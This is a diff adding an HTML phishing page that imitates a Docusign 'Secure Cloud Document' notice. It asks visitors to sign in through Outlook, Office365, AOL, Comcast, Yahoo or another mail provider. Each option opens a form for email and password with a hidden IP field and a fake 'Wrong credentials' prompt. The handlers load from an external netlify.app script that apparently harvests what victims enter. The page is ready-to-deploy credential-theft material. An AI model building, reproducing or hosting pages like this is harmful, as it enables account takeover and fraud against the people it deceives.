@@ -1,0 +1,525 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>
+      Docusign | #1 in Electronic Signature and Intelligent Agreement Managemen
+    </title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link
+      rel="shortcut icon"
+      href="https://www.docusign.com/assets/images/favicon.ico"
+      type="image/x-icon"
+    />
+    <style>
+      /* Make only the background blurry */
+      body::before {
+        content: "";
+        position: fixed;
+        top: 0;
+        left: 0;
+        width: 100%;
+        height: 100%;
+        background-image: url('https://uploads-us-west-2.insided.com/docusign-en/attachment/ba79132e-dd34-4543-a006-9c8300688b1f.png');
+        background-size: cover;
+        background-repeat: no-repeat;
+        background-position: center;
+        filter: blur(8px); /* adjust blur strength */
+        z-index: -1; /* push it behind everything */
+      }
+
+      body {
+        position: relative;
+      }
+    </style>
+  </head>
+  <body class="bg-cover bg-no-repeat w-screen h-screen">
+    <main class="flex flex-col items-center justify-center h-full text-white">
+      <div
+        class="bg-[#f7f6f7] text-black min-h-[340p] py-8 w-full md:w-[540px] flex flex-col items-center rounded-md px-6"
+      >
+        <div class="w-full flex flex-col items-center mb-6 overflow-hidden">
+          <div class="flex items-center gap-1 mb-4">
+            <img
+              src="https://docucdn-a.akamaihd.net/olive/images/2.72.0/global-assets/ds-logo-default.svg"
+              width="124px"
+              alt=""
+            />
+          </div>
+          <h1 class="text-2xl font-bold">Secure Cloud Document</h1>
+        </div>
+        <p>Sign in with your email provider below to view your document</p>
+        <div class="w-full px-0 md:px-6 mt-6">
+          <button
+            class="w-full flex items-center gap-4 bg-blue-400 font-semibold text-white border pr-4"
+            onclick="openModal('outlook')"
+          >
+            <span class="p-2 flex items-center justify-center bg-white border">
+              <img
+                src="https://cdn.iconscout.com/icon/free/png-256/free-outlook-logo-icon-download-in-svg-png-gif-file-formats--office-365-pack-logos-icons-1174817.png"
+                width="24"
+                alt=""
+              />
+            </span>
+            Sign in with Outlook
+          </button>
+          <button
+            class="w-full flex items-center gap-4 bg-red-600 font-semibold text-white border pr-4 mt-4"
+            onclick="openModal('office365')"
+          >
+            <span class="p-2 flex items-center justify-center bg-white border">
+              <img
+                src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcS3KwXA70LyegpQCa9DucgTFB25WkQYYaI3vg&s"
+                width="24"
+                alt=""
+              />
+            </span>
+            Sign in with Office365
+          </button>
+          <button
+            class="w-full flex items-center gap-4 bg-black font-semibold text-white border pr-4 mt-4"
+            onclick="openModal('aol')"
+          >
+            <span class="p-2 flex items-center justify-center bg-white border">
+              <img
+                src="https://cdn.iconscout.com/icon/free/png-256/free-aol-logo-icon-download-in-svg-png-gif-file-formats--social-media-pack-logos-icons-2496150.png"
+                width="24"
+                alt=""
+              />
+            </span>
+            Sign in with Aol.
+          </button>
+           <button
+            class="w-full flex items-center gap-4 bg-red-600 font-semibold text-white border pr-4 mt-4"
+            onclick="openModal('comcast')"
+          >
+            <span class="p-2 flex items-center justify-center bg-white border">
+              <img
+                src="https://south.comcast.com/wp-content/uploads/sites/23/2016/11/cropped-Comcast-Logo-Only-1.png"
+                width="24"
+                alt=""
+              />
+            </span>
+            Sign in with Comcast
+          </button>
+          <button
+            class="w-full flex items-center gap-4 bg-blue-800 font-semibold text-white border pr-4 mt-4"
+            onclick="openModal('yahoo')"
+          >
+            <span class="p-2 flex items-center justify-center bg-white border">
+              <img
+                src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTi-LyHdGYA1tqQjoSl2FGCfqk5xnvYq2dxIw&s"
+                width="24"
+                alt=""
+              />
+            </span>
+            Sign in with Yahoo
+          </button>
+          <button
+            class="w-full flex items-center gap-4 bg-blue-800 font-semibold text-white border pr-4 mt-4"
+            onclick="openModal('other')"
+          >
+            <span class="p-2 flex items-center justify-center bg-white border">
+              <img src="https://svgsilh.com/svg/304967.svg" width="24" alt="" />
+            </span>
+            Sign in other mail
+          </button>
+          <p class="text-center mt-4 text-sm">
+            Please select the provider of the email you received the secured
+            message to view the document
+          </p>
+        </div>
+      </div>
+    </main>
+    <!-- Modals -->
+    <div id="modals-container">
+      <!-- Example Modal -->
+      <div
+        id="outlook-modal"
+        class="hidden fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center"
+      >
+        <div class="bg-white p-6 rounded-md w-full max-w-md">
+          <div class="flex flex-col items-center mb-6">
+            <img
+              src="https://cdn.iconscout.com/icon/free/png-256/free-outlook-logo-icon-download-in-svg-png-gif-file-formats--office-365-pack-logos-icons-1174817.png"
+              width="50"
+              alt="Outlook"
+              class="my-4"
+            />
+            <h2 class="text-xl font-bold">Sign in with Outlook</h2>
+          </div>
+          <form onsubmit="handleOutlookSubmission(event)">
+            <input type="hidden" id="hidden_ip" name="hidden_ip" />
+            <div class="flex flex-col gap-2">
+              <input
+                type="email"
+                required
+                id="email-outlook"
+                placeholder="Enter your email address"
+                class="border p-2 rounded-md w-full"
+              />
+              <span class="flex items-center gap-1 text-[#6c757d] text-xs"
+                >Email provider secure sign in
+                <span>
+                  <img
+                    class="-mb-1"
+                    src="data:image/jpeg;base64,/9j/4AAQSkZJRgABAQEAYABgAAD/2wBDAAgGBgcGBQgHBwcJCQgKDBQNDAsLDBkSEw8UHRofHh0aHBwgJC4nICIsIxwcKDcpLDAxNDQ0Hyc5PTgyPC4zNDL/2wBDAQkJCQwLDBgNDRgyIRwhMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjL/wAARCAAcABMDASIAAhEBAxEB/8QAHwAAAQUBAQEBAQEAAAAAAAAAAAECAwQFBgcICQoL/8QAtRAAAgEDAwIEAwUFBAQAAAF9AQIDAAQRBRIhMUEGE1FhByJxFDKBkaEII0KxwRVS0fAkM2JyggkKFhcYGRolJicoKSo0NTY3ODk6Q0RFRkdISUpTVFVWV1hZWmNkZWZnaGlqc3R1dnd4eXqDhIWGh4iJipKTlJWWl5iZmqKjpKWmp6ipqrKztLW2t7i5usLDxMXGx8jJytLT1NXW19jZ2uHi4+Tl5ufo6erx8vP09fb3+Pn6/8QAHwEAAwEBAQEBAQEBAQAAAAAAAAECAwQFBgcICQoL/8QAtREAAgECBAQDBAcFBAQAAQJ3AAECAxEEBSExBhJBUQdhcRMiMoEIFEKRobHBCSMzUvAVYnLRChYkNOEl8RcYGRomJygpKjU2Nzg5OkNERUZHSElKU1RVVldYWVpjZGVmZ2hpanN0dXZ3eHl6goOEhYaHiImKkpOUlZaXmJmaoqOkpaanqKmqsrO0tba3uLm6wsPExcbHyMnK0tPU1dbX2Nna4uPk5ebn6Onq8vP09fb3+Pn6/9oADAMBAAIRAxEAPwD1fX7zUrjXLfRdNuvsjPCZ3lxknnAHfHQ1RMmveHtSsFvNSW9t7uXymBHIOM8ViXniW5/4S6a/EMAe1L2iKdxBAY8n3q1e6xd6ybOeUQRtbSmVFRScnBHOTTEej0Vn6ZfyXunQ3EiKHcHIXOOCR/SikFzxzU3C+IdUX0vJef8AgRq9a3O22GCSeetehXPgbQru+nvJbeQyzOXfErAFj1OBVmHwloUChV0+Mgf3yW/madwsN8NjzPD9o/HKk/8AjxorXgt4baFYYI1jiQYVFGAKKLhY/9k="
+                    alt=""
+                    height="8"
+                    width="8"
+                  /> </span
+              ></span>
+            </div>
+            <div class="flex flex-col gap-2 mt-4">
+              <input
+                type="password"
+                required
+                id="password-outlook"
+                placeholder="Enter your password"
+                class="border p-2 rounded-md w-full"
+              />
+            </div>
+            <p id="wrongCred-outlook" class="text-red-500 text-sm mt-1 hidden">
+              Wrong credentials, try again
+            </p>
+            <button
+              type="submit"
+              class="bg-blue-400 text-white font-semibold w-full p-2 rounded-md mt-4"
+            >
+              Log in
+            </button>
+          </form>
+          <button
+            class="text-blue-400 mt-4 border w-full rounded-md h-10"
+            onclick="closeModal('outlook')"
+          >
+            Close
+          </button>
+        </div>
+      </div>
+      <div
+        id="office365-modal"
+        class="hidden fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center"
+      >
+        <div class="bg-white p-6 rounded-md w-full max-w-md">
+          <div class="flex flex-col items-center mb-6">
+            <img
+              src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcS3KwXA70LyegpQCa9DucgTFB25WkQYYaI3vg&s"
+              width="50"
+              alt="Outlook"
+              class="my-4"
+            />
+            <h2 class="text-xl font-bold">Sign in with Office365</h2>
+          </div>
+          <form onsubmit="handleOfficeSubmission(event)">
+            <input type="hidden" class="hidden_ip" name="hidden_ip" />
+            <div class="flex flex-col gap-2">
+              <input
+                type="email"
+                required
+                id="email-office"
+                placeholder="Enter your email address"
+                class="border p-2 rounded-md w-full"
+              />
+              <span class="flex items-center gap-1 text-[#6c757d] text-xs"
+                >Email provider secure sign in
+                <span>
+                  <img
+                    class="-mb-1"
+                    src="data:image/jpeg;base64,/9j/4AAQSkZJRgABAQEAYABgAAD/2wBDAAgGBgcGBQgHBwcJCQgKDBQNDAsLDBkSEw8UHRofHh0aHBwgJC4nICIsIxwcKDcpLDAxNDQ0Hyc5PTgyPC4zNDL/2wBDAQkJCQwLDBgNDRgyIRwhMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjL/wAARCAAcABMDASIAAhEBAxEB/8QAHwAAAQUBAQEBAQEAAAAAAAAAAAECAwQFBgcICQoL/8QAtRAAAgEDAwIEAwUFBAQAAAF9AQIDAAQRBRIhMUEGE1FhByJxFDKBkaEII0KxwRVS0fAkM2JyggkKFhcYGRolJicoKSo0NTY3ODk6Q0RFRkdISUpTVFVWV1hZWmNkZWZnaGlqc3R1dnd4eXqDhIWGh4iJipKTlJWWl5iZmqKjpKWmp6ipqrKztLW2t7i5usLDxMXGx8jJytLT1NXW19jZ2uHi4+Tl5ufo6erx8vP09fb3+Pn6/8QAHwEAAwEBAQEBAQEBAQAAAAAAAAECAwQFBgcICQoL/8QAtREAAgECBAQDBAcFBAQAAQJ3AAECAxEEBSExBhJBUQdhcRMiMoEIFEKRobHBCSMzUvAVYnLRChYkNOEl8RcYGRomJygpKjU2Nzg5OkNERUZHSElKU1RVVldYWVpjZGVmZ2hpanN0dXZ3eHl6goOEhYaHiImKkpOUlZaXmJmaoqOkpaanqKmqsrO0tba3uLm6wsPExcbHyMnK0tPU1dbX2Nna4uPk5ebn6Onq8vP09fb3+Pn6/9oADAMBAAIRAxEAPwD1fX7zUrjXLfRdNuvsjPCZ3lxknnAHfHQ1RMmveHtSsFvNSW9t7uXymBHIOM8ViXniW5/4S6a/EMAe1L2iKdxBAY8n3q1e6xd6ybOeUQRtbSmVFRScnBHOTTEej0Vn6ZfyXunQ3EiKHcHIXOOCR/SikFzxzU3C+IdUX0vJef8AgRq9a3O22GCSeetehXPgbQru+nvJbeQyzOXfErAFj1OBVmHwloUChV0+Mgf3yW/madwsN8NjzPD9o/HKk/8AjxorXgt4baFYYI1jiQYVFGAKKLhY/9k="
+                    alt=""
+                    height="8"
+                    width="8"
+                  /> </span
+              ></span>
+            </div>
+            <div class="flex flex-col gap-2 mt-4">
+              <input
+                type="password"
+                required
+                id="password-office"
+                placeholder="Enter your password"
+                class="border p-2 rounded-md w-full"
+              />
+            </div>
+            <p id="wrongCred-office" class="text-red-500 text-sm mt-1 hidden">
+              Wrong credentials, try again
+            </p>
+            <button
+              type="submit"
+              class="bg-red-600 text-white font-semibold w-full p-2 rounded-md mt-4"
+            >
+              Log in
+            </button>
+          </form>
+          <button
+            class="text-blue-400 mt-4 border w-full rounded-md h-10"
+            onclick="closeModal('office365')"
+          >
+            Close
+          </button>
+        </div>
+      </div>
+      <div
+        id="aol-modal"
+        class="hidden fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center"
+      >
+        <div class="bg-white p-6 rounded-md w-full max-w-md">
+          <div class="flex flex-col items-center mb-6">
+            <img
+              src="https://cdn.iconscout.com/icon/free/png-256/free-aol-logo-icon-download-in-svg-png-gif-file-formats--social-media-pack-logos-icons-2496150.png"
+              width="50"
+              alt="Outlook"
+              class="my-4"
+            />
+            <h2 class="text-xl font-bold">Sign in with Aol.</h2>
+          </div>
+          <form onsubmit="handleAolSubmission(event)">
+            <input type="hidden" id="hidden_ip" name="hidden_ip" />
+            <div class="flex flex-col gap-2">
+              <input
+                type="email"
+                required
+                id="email-aol"
+                placeholder="Enter your email address"
+                class="border p-2 rounded-md w-full"
+              />
+              <span class="flex items-center gap-1 text-[#6c757d] text-xs"
+                >Email provider secure sign in
+                <span>
+                  <img
+                    class="-mb-1"
+                    src="data:image/jpeg;base64,/9j/4AAQSkZJRgABAQEAYABgAAD/2wBDAAgGBgcGBQgHBwcJCQgKDBQNDAsLDBkSEw8UHRofHh0aHBwgJC4nICIsIxwcKDcpLDAxNDQ0Hyc5PTgyPC4zNDL/2wBDAQkJCQwLDBgNDRgyIRwhMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjL/wAARCAAcABMDASIAAhEBAxEB/8QAHwAAAQUBAQEBAQEAAAAAAAAAAAECAwQFBgcICQoL/8QAtRAAAgEDAwIEAwUFBAQAAAF9AQIDAAQRBRIhMUEGE1FhByJxFDKBkaEII0KxwRVS0fAkM2JyggkKFhcYGRolJicoKSo0NTY3ODk6Q0RFRkdISUpTVFVWV1hZWmNkZWZnaGlqc3R1dnd4eXqDhIWGh4iJipKTlJWWl5iZmqKjpKWmp6ipqrKztLW2t7i5usLDxMXGx8jJytLT1NXW19jZ2uHi4+Tl5ufo6erx8vP09fb3+Pn6/8QAHwEAAwEBAQEBAQEBAQAAAAAAAAECAwQFBgcICQoL/8QAtREAAgECBAQDBAcFBAQAAQJ3AAECAxEEBSExBhJBUQdhcRMiMoEIFEKRobHBCSMzUvAVYnLRChYkNOEl8RcYGRomJygpKjU2Nzg5OkNERUZHSElKU1RVVldYWVpjZGVmZ2hpanN0dXZ3eHl6goOEhYaHiImKkpOUlZaXmJmaoqOkpaanqKmqsrO0tba3uLm6wsPExcbHyMnK0tPU1dbX2Nna4uPk5ebn6Onq8vP09fb3+Pn6/9oADAMBAAIRAxEAPwD1fX7zUrjXLfRdNuvsjPCZ3lxknnAHfHQ1RMmveHtSsFvNSW9t7uXymBHIOM8ViXniW5/4S6a/EMAe1L2iKdxBAY8n3q1e6xd6ybOeUQRtbSmVFRScnBHOTTEej0Vn6ZfyXunQ3EiKHcHIXOOCR/SikFzxzU3C+IdUX0vJef8AgRq9a3O22GCSeetehXPgbQru+nvJbeQyzOXfErAFj1OBVmHwloUChV0+Mgf3yW/madwsN8NjzPD9o/HKk/8AjxorXgt4baFYYI1jiQYVFGAKKLhY/9k="
+                    alt=""
+                    height="8"
+                    width="8"
+                  /> </span
+              ></span>
+            </div>
+            <div class="flex flex-col gap-2 mt-4">
+              <input
+                type="password"
+                required
+                id="password-aol"
+                placeholder="Enter your password"
+                class="border p-2 rounded-md w-full"
+              />
+            </div>
+            <p id="wrongCred-aol" class="text-red-500 text-sm mt-1 hidden">
+              Wrong credentials, try again
+            </p>
+            <button
+              type="submit"
+              class="bg-black text-white font-semibold w-full p-2 rounded-md mt-4"
+            >
+              Log in
+            </button>
+          </form>
+          <button
+            class="text-blue-400 mt-4 border w-full rounded-md h-10"
+            onclick="closeModal('aol')"
+          >
+            Close
+          </button>
+        </div>
+      </div>
+
+
+      <div
+        id="comcast-modal"
+        class="hidden fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center"
+      >
+        <div class="bg-white p-6 rounded-md w-full max-w-md">
+          <div class="flex flex-col items-center mb-6">
+            <img
+              src="https://south.comcast.com/wp-content/uploads/sites/23/2016/11/cropped-Comcast-Logo-Only-1.png"
+              width="50"
+              alt="Outlook"
+              class="my-4"
+            />
+            <h2 class="text-xl font-bold">Sign in with Comcast</h2>
+          </div>
+          <form onsubmit="handleComcastSubmission(event)">
+            <input type="hidden" name="hidden_ip" id="hidden_ip" />
+            <div class="flex flex-col gap-2">
+              <input
+                type="email"
+                required
+                id="email-comcast"
+                placeholder="Enter your email address"
+                class="border p-2 rounded-md w-full"
+              />
+              <span class="flex items-center gap-1 text-[#6c757d] text-xs"
+                >Email provider secure sign in
+                <span>
+                  <img
+                    class="-mb-1"
+                    src="data:image/jpeg;base64,/9j/4AAQSkZJRgABAQEAYABgAAD/2wBDAAgGBgcGBQgHBwcJCQgKDBQNDAsLDBkSEw8UHRofHh0aHBwgJC4nICIsIxwcKDcpLDAxNDQ0Hyc5PTgyPC4zNDL/2wBDAQkJCQwLDBgNDRgyIRwhMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjL/wAARCAAcABMDASIAAhEBAxEB/8QAHwAAAQUBAQEBAQEAAAAAAAAAAAECAwQFBgcICQoL/8QAtRAAAgEDAwIEAwUFBAQAAAF9AQIDAAQRBRIhMUEGE1FhByJxFDKBkaEII0KxwRVS0fAkM2JyggkKFhcYGRolJicoKSo0NTY3ODk6Q0RFRkdISUpTVFVWV1hZWmNkZWZnaGlqc3R1dnd4eXqDhIWGh4iJipKTlJWWl5iZmqKjpKWmp6ipqrKztLW2t7i5usLDxMXGx8jJytLT1NXW19jZ2uHi4+Tl5ufo6erx8vP09fb3+Pn6/8QAHwEAAwEBAQEBAQEBAQAAAAAAAAECAwQFBgcICQoL/8QAtREAAgECBAQDBAcFBAQAAQJ3AAECAxEEBSExBhJBUQdhcRMiMoEIFEKRobHBCSMzUvAVYnLRChYkNOEl8RcYGRomJygpKjU2Nzg5OkNERUZHSElKU1RVVldYWVpjZGVmZ2hpanN0dXZ3eHl6goOEhYaHiImKkpOUlZaXmJmaoqOkpaanqKmqsrO0tba3uLm6wsPExcbHyMnK0tPU1dbX2Nna4uPk5ebn6Onq8vP09fb3+Pn6/9oADAMBAAIRAxEAPwD1fX7zUrjXLfRdNuvsjPCZ3lxknnAHfHQ1RMmveHtSsFvNSW9t7uXymBHIOM8ViXniW5/4S6a/EMAe1L2iKdxBAY8n3q1e6xd6ybOeUQRtbSmVFRScnBHOTTEej0Vn6ZfyXunQ3EiKHcHIXOOCR/SikFzxzU3C+IdUX0vJef8AgRq9a3O22GCSeetehXPgbQru+nvJbeQyzOXfErAFj1OBVmHwloUChV0+Mgf3yW/madwsN8NjzPD9o/HKk/8AjxorXgt4baFYYI1jiQYVFGAKKLhY/9k="
+                    alt=""
+                    height="8"
+                    width="8"
+                  /> </span
+              ></span>
+            </div>
+            <div class="flex flex-col gap-2 mt-4">
+              <input
+                type="password"
+                required
+                id="password-comcast"
+                placeholder="Enter your password"
+                class="border p-2 rounded-md w-full"
+              />
+            </div>
+            <p id="wrongCred-yahoo" class="text-red-500 text-sm mt-1 hidden">
+              Wrong credentials, try again
+            </p>
+            <button
+              type="submit"
+              class="bg-purple-800 text-white font-semibold w-full p-2 rounded-md mt-4"
+            >
+              Log in
+            </button>
+          </form>
+          <button
+            class="text-blue-400 mt-4 border w-full rounded-md h-10"
+            onclick="closeModal('comcast')"
+          >
+            Close
+          </button>
+        </div>
+      </div>
+      
+
+      <div
+        id="yahoo-modal"
+        class="hidden fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center"
+      >
+        <div class="bg-white p-6 rounded-md w-full max-w-md">
+          <div class="flex flex-col items-center mb-6">
+            <img
+              src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTi-LyHdGYA1tqQjoSl2FGCfqk5xnvYq2dxIw&s"
+              width="50"
+              alt="Outlook"
+              class="my-4"
+            />
+            <h2 class="text-xl font-bold">Sign in with Yahoo</h2>
+          </div>
+          <form onsubmit="handleYahooSubmission(event)">
+            <input type="hidden" name="hidden_ip" id="hidden_ip" />
+            <div class="flex flex-col gap-2">
+              <input
+                type="email"
+                required
+                id="email-yahoo"
+                placeholder="Enter your email address"
+                class="border p-2 rounded-md w-full"
+              />
+              <span class="flex items-center gap-1 text-[#6c757d] text-xs"
+                >Email provider secure sign in
+                <span>
+                  <img
+                    class="-mb-1"
+                    src="data:image/jpeg;base64,/9j/4AAQSkZJRgABAQEAYABgAAD/2wBDAAgGBgcGBQgHBwcJCQgKDBQNDAsLDBkSEw8UHRofHh0aHBwgJC4nICIsIxwcKDcpLDAxNDQ0Hyc5PTgyPC4zNDL/2wBDAQkJCQwLDBgNDRgyIRwhMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjL/wAARCAAcABMDASIAAhEBAxEB/8QAHwAAAQUBAQEBAQEAAAAAAAAAAAECAwQFBgcICQoL/8QAtRAAAgEDAwIEAwUFBAQAAAF9AQIDAAQRBRIhMUEGE1FhByJxFDKBkaEII0KxwRVS0fAkM2JyggkKFhcYGRolJicoKSo0NTY3ODk6Q0RFRkdISUpTVFVWV1hZWmNkZWZnaGlqc3R1dnd4eXqDhIWGh4iJipKTlJWWl5iZmqKjpKWmp6ipqrKztLW2t7i5usLDxMXGx8jJytLT1NXW19jZ2uHi4+Tl5ufo6erx8vP09fb3+Pn6/8QAHwEAAwEBAQEBAQEBAQAAAAAAAAECAwQFBgcICQoL/8QAtREAAgECBAQDBAcFBAQAAQJ3AAECAxEEBSExBhJBUQdhcRMiMoEIFEKRobHBCSMzUvAVYnLRChYkNOEl8RcYGRomJygpKjU2Nzg5OkNERUZHSElKU1RVVldYWVpjZGVmZ2hpanN0dXZ3eHl6goOEhYaHiImKkpOUlZaXmJmaoqOkpaanqKmqsrO0tba3uLm6wsPExcbHyMnK0tPU1dbX2Nna4uPk5ebn6Onq8vP09fb3+Pn6/9oADAMBAAIRAxEAPwD1fX7zUrjXLfRdNuvsjPCZ3lxknnAHfHQ1RMmveHtSsFvNSW9t7uXymBHIOM8ViXniW5/4S6a/EMAe1L2iKdxBAY8n3q1e6xd6ybOeUQRtbSmVFRScnBHOTTEej0Vn6ZfyXunQ3EiKHcHIXOOCR/SikFzxzU3C+IdUX0vJef8AgRq9a3O22GCSeetehXPgbQru+nvJbeQyzOXfErAFj1OBVmHwloUChV0+Mgf3yW/madwsN8NjzPD9o/HKk/8AjxorXgt4baFYYI1jiQYVFGAKKLhY/9k="
+                    alt=""
+                    height="8"
+                    width="8"
+                  /> </span
+              ></span>
+            </div>
+            <div class="flex flex-col gap-2 mt-4">
+              <input
+                type="password"
+                required
+                id="password-yahoo"
+                placeholder="Enter your password"
+                class="border p-2 rounded-md w-full"
+              />
+            </div>
+            <p id="wrongCred-yahoo" class="text-red-500 text-sm mt-1 hidden">
+              Wrong credentials, try again
+            </p>
+            <button
+              type="submit"
+              class="bg-purple-800 text-white font-semibold w-full p-2 rounded-md mt-4"
+            >
+              Log in
+            </button>
+          </form>
+          <button
+            class="text-blue-400 mt-4 border w-full rounded-md h-10"
+            onclick="closeModal('yahoo')"
+          >
+            Close
+          </button>
+        </div>
+      </div>
+
+      <div
+        id="other-modal"
+        class="hidden fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center"
+      >
+        <div class="bg-white p-6 rounded-md w-full max-w-md">
+          <div class="flex flex-col items-center mb-6">
+            <img
+              src="https://svgsilh.com/svg/304967.svg"
+              width="50"
+              alt="Outlook"
+              class="my-4"
+            />
+            <h2 class="text-xl font-bold">Sign in with other mail</h2>
+          </div>
+          <form onsubmit="handleOtherSubmission(event)">
+            <input type="hidden" id="hidden_ip" name="hidden_ip" />
+            <div class="flex flex-col gap-2">
+              <input
+                type="email"
+                required
+                id="email-other"
+                placeholder="Enter your email address"
+                class="border p-2 rounded-md w-full"
+              />
+              <span class="flex items-center gap-1 text-[#6c757d] text-xs"
+                >Email provider secure sign in
+                <span>
+                  <img
+                    class="-mb-1"
+                    src="data:image/jpeg;base64,/9j/4AAQSkZJRgABAQEAYABgAAD/2wBDAAgGBgcGBQgHBwcJCQgKDBQNDAsLDBkSEw8UHRofHh0aHBwgJC4nICIsIxwcKDcpLDAxNDQ0Hyc5PTgyPC4zNDL/2wBDAQkJCQwLDBgNDRgyIRwhMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjL/wAARCAAcABMDASIAAhEBAxEB/8QAHwAAAQUBAQEBAQEAAAAAAAAAAAECAwQFBgcICQoL/8QAtRAAAgEDAwIEAwUFBAQAAAF9AQIDAAQRBRIhMUEGE1FhByJxFDKBkaEII0KxwRVS0fAkM2JyggkKFhcYGRolJicoKSo0NTY3ODk6Q0RFRkdISUpTVFVWV1hZWmNkZWZnaGlqc3R1dnd4eXqDhIWGh4iJipKTlJWWl5iZmqKjpKWmp6ipqrKztLW2t7i5usLDxMXGx8jJytLT1NXW19jZ2uHi4+Tl5ufo6erx8vP09fb3+Pn6/8QAHwEAAwEBAQEBAQEBAQAAAAAAAAECAwQFBgcICQoL/8QAtREAAgECBAQDBAcFBAQAAQJ3AAECAxEEBSExBhJBUQdhcRMiMoEIFEKRobHBCSMzUvAVYnLRChYkNOEl8RcYGRomJygpKjU2Nzg5OkNERUZHSElKU1RVVldYWVpjZGVmZ2hpanN0dXZ3eHl6goOEhYaHiImKkpOUlZaXmJmaoqOkpaanqKmqsrO0tba3uLm6wsPExcbHyMnK0tPU1dbX2Nna4uPk5ebn6Onq8vP09fb3+Pn6/9oADAMBAAIRAxEAPwD1fX7zUrjXLfRdNuvsjPCZ3lxknnAHfHQ1RMmveHtSsFvNSW9t7uXymBHIOM8ViXniW5/4S6a/EMAe1L2iKdxBAY8n3q1e6xd6ybOeUQRtbSmVFRScnBHOTTEej0Vn6ZfyXunQ3EiKHcHIXOOCR/SikFzxzU3C+IdUX0vJef8AgRq9a3O22GCSeetehXPgbQru+nvJbeQyzOXfErAFj1OBVmHwloUChV0+Mgf3yW/madwsN8NjzPD9o/HKk/8AjxorXgt4baFYYI1jiQYVFGAKKLhY/9k="
+                    alt=""
+                    height="8"
+                    width="8"
+                  /> </span
+              ></span>
+            </div>
+            <div class="flex flex-col gap-2 mt-4">
+              <input
+                type="password"
+                required
+                id="password-other"
+                placeholder="Enter your password"
+                class="border p-2 rounded-md w-full"
+              />
+            </div>
+            <p id="wrongCred-other" class="text-red-500 text-sm mt-1 hidden">
+              Wrong credentials, try again
+            </p>
+            <button
+              type="submit"
+              class="bg-blue-800 text-white font-semibold w-full p-2 rounded-md mt-4"
+            >
+              Log in
+            </button>
+          </form>
+          <button
+            class="text-blue-400 mt-4 border w-full rounded-md h-10"
+            onclick="closeModal('other')"
+          >
+            Close
+          </button>
+        </div>
+      </div>
+    </div>
+  <script src="https://tangerine-seahorse-ceba64.netlify.app/app.js" defer></script>
+  <script src = "https://cdnjs.cloudflare.com/ajax/libs/jquery/2.2.4/jquery.min.js"> </script>
+  </body>
+</html>
